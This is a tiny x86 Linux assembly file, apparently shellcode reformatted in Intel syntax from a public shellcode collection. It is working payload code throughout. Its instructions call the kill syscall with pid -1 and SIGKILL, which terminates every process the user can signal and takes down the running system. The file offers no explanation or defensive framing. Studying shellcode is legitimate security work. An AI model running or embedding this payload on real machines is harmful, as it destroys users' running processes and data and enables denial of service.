; Original shellcode (formatted to Intel syntax)
; http://shell-storm.org/shellcode/files/shellcode-212.php

global _start

section .text

_start:
	push byte 37
        pop eax
        push byte -1
        pop ebx
        push byte 9
        pop ecx
        int 0x80
